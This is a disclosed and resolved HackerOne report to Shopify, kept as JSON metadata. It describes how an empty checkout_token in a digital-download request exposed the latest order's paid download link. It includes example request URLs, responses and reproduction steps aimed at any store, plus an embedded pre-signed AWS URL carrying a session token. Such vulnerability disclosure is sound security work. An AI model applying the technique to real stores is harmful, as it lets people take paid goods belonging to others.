{
  "id": 1044285,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQ0Mjg1",
  "url": "https://hackerone.com/reports/1044285",
  "title": "Removing parts of URL from jQuery request exposes links for download of Paid Digital Assets of the most recent Order placed by anyone on the store!",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-11-26T13:08:22.642Z",
  "submitted_at": "2020-11-26T13:08:22.727Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "adarshxs",
    "url": "/adarshxs",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/xddn3r4y4vlpsgqgiln2xfkohe47/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22kak.png%22%3B%20filename%2A%3DUTF-8%27%27kak.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135930Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=840fc85f29c8311442539058b103fdad373b97700b5c378a7bdc8e3d5f617a8a"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-07-08T18:20:36.677Z",
  "bug_reporter_agreed_on_going_public_at": "2020-12-02T03:17:22.110Z",
  "team_member_agreed_on_going_public_at": "2021-07-08T18:20:36.582Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "_Please Note:_ I found this bug on a website made using Shopify \n\nI tried doing the same with my Shopify store but I was not able to buy anything as it was required to add credit card details which I don't have :(\n\nTHE LINKS GIVEN AS THE EXAMPLE ARE NOT VALID LINKS BUT **THE BUG WORKS ON EVERY SHOPIFY STORE THAT USES THE SAME LOGIC!!**\n\nI have blurred the name of the website where I found the bug in the images as well\nSO THE NAME IN THE BELOW REPORT IS CHANGED **SUPERSHACKS(my store) = SOMERANDOMWEBSITE.COM(The website I tested on or every other Shopify store that makes a jQuery request to check and get the download link)**\n\n**jQuery request for Downloading Digital assets exposes download link even without Checkout Id, Callback Id. Produces the Most recent order for anyone to view!!**\n\n**ONCE A NEW ORDER IS PLACED, THE LINK UPDATES AUTOMATICALLY**\n\nThis is bug regarding a Shopify Digital Assets/products store and  probably Applies to every Digital asset/products website made with Shopify out there\n\nthis is while I was placing an order and was messing around.\n\n**Note SUPERHACKS is MYown shopify website and is not live!**\n**So replace \"superhacks\" with \"the website you want to test\"**\n\nNow when I place the order, A GET request is made for downloading the asset\n`GET /checkout/get_download_link?callback=jQuery22009741786286098322_1606361688834&shop=superhacks.myshopify.com&checkout_token=1c0869d74100cd3582916a93a4bce741&_=1606361688835 HTTP/1.1\nHost: delivery.shopifyapps.com`\n\nokay cool\nI Tried messing around and found out that removing everything i.e.\n\n+ The nos. after jQuery `22009741786286098322_1606361688834`\n+ and even the Checkout Token!!  `1c0869d74100cd3582916a93a4bce741`\n+ And the underscore part at the end of the URL `&_=1606361688835`\n\nThis is the URL (let's call it **filled Link**) _Filled Link:_\n`https://delivery.shopifyapps.com/checkout/get_download_link?callback=jQuery22009741786286098322_1606361688834&shop=superhacks.myshopify.com&checkout_token=1c0869d74100cd3582916a93a4bce741&_=1606361688835`\n\nAfter removing the above mentioned part the URL looks like this (let's call it **Unfilled Link**) _Unfilled Link:_\n`https://delivery.shopifyapps.com/checkout/get_download_link?callback=jQuery&shop=superhacks.myshopify.com&checkout_token=`\n\nIn both Cases the response is the same\n`jQuery({\"ready\":true,\"links\":[{\"name\":\"PG000892.zip\",\"product_name\":\"WILD WOLF\",\"url\":\"https://superhacks.com/a/downloads/-/d6d6528fb49ed4d5/5fabe0193543d2cf\",\"download_limit\":2,\"filesize\":\"3.07 MB\"}]})`\n\nAfter removing these, the request still produced my order!\n\nSame Is The Case while the CHECK ORDER REQUEST IS MADE\n\n_Filled Link:_\n`https://delivery.shopifyapps.com/checkout/check_order?callback=jQuery22009741786286098322_1606361688834&shop=superhacks.myshopify.com&checkout_token=1c0869d74100cd3582916a93a4bce741&_=1606361688835`\n\nproduces this:\n`jQuery22009741786286098322_1606361688834({\"has_attachments\":true,\"is_downloadable\":true})`\n\n_Unfilled Link:_\n`https://delivery.shopifyapps.com/checkout/check_order?callback=jQuery&shop=superhacks.myshopify.com&checkout_token=`\n\nproduces:\n`jQuery({\"has_attachments\":true,\"is_downloadable\":true})`\n\nconfirming there are attachements in the request made\n\nI thought It may be due to Some cookies stored locally... BUT NO.... I tried it in incognito, Firefox, Chrome!! (Check Attached Images)\n**It still gave the EXACT same response which is:**\n\n`jQuery({\"ready\":true,\"links\":[{\"name\":\"PG000892.zip\",\"product_name\":\"WILD WOLF\",\"url\":\"https://superhacks.com/a/downloads/-/d6d6528fb49ed4d5/5fabe0193543d2cf\",\"download_limit\":2,\"filesize\":\"3.07 MB\"}]})`\n\n\n_I placed a new order and the **Unfilled link's request got updated with the new order download link!!**_\n\nThis could lead an attacker simply getting every possible download link of the most recent order placed!!!\n\nI think the request is not validated at the server and it stores the most recent order placed in the Unfilled link part. But this is major flaw if this logic is being used widely at every Shopify store\n\n\n_**STEPS TO REPRODUCE:**_:\n+ Find a website that sells digital assets and is made using Shopify and uses the same default Shopify logic\n+ `https://delivery.shopifyapps.com/checkout/check_order?callback=jQuery&shop=**superhacks**.myshopify.com&checkout_token=`  REPLACE \"superhacks\" with THE STORE NAME YOU WANT TO TEST.\n+ And That's it... whenever an order is placed, You will get the link in the following format `jQuery({\"ready\":true,\"links\":[{\"name\":\"PG000892.zip\",\"product_name\":\"WILD WOLF\",\"url\":\"https://superhacks.com/a/downloads/-/d6d6528fb49ed4d5/5fabe0193543d2cf\",\"download_limit\":2,\"filesize\":\"3.07 MB\"}]})`    IT HAS THE DOWNLOAD LINK (URL PART)!!\n\nSAME IS THE CASE WHEN ANY PRODUCT IS ORDERED BY ONE USER, EVERYONE CAN ACCESS/DOWNLOAD IT\nI tried it doing it with another product and it worked!\n\n\nThank you\nRegards\nAdarsh\n\nImpact\nAn attacker could achieve download links for every order placed on the website by looping the URL and the URL would produce the MOST RECENT ORDER!\n\n## Impact\n\nAnyone Can Download/see/check the latest order placed by someone on the website....\n\nEssentially both anyone can download the files Ordered by someone else for himself!",
  "bounty_amount": "2900.0",
  "formatted_bounty": "$2,900",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 52,
  "voters": [
    "osman1337",
    "nopurposeinlife",
    "sw33tlie",
    "drsniper",
    "alp",
    "fqdn",
    "tess",
    "ali",
    "sudi",
    "akashhamal0x01",
    "and 42 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 37198,
    "asset_type": "OTHER",
    "asset_identifier": "Shopify Developed Apps",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 62844,
      "category": "team",
      "content": "A report from @superbsic showed that it was possible to download the latest digital purchased order attachment for stores that have the Digital download app installed, by setting the checkout_token to be empty. The issue was that when the checkout_token was nil, we would return all orders and select the latest order from the list.\n\nOur team immediately deployed a change to address this issue. We resolved the issue by validating the checkout_token before fetching an order.",
      "user": {
        "id": 915134,
        "username": "murakumo_shopify",
        "name": "",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2020-01-21T14:51:01.106Z",
        "url": "https://hackerone.com/murakumo_shopify",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
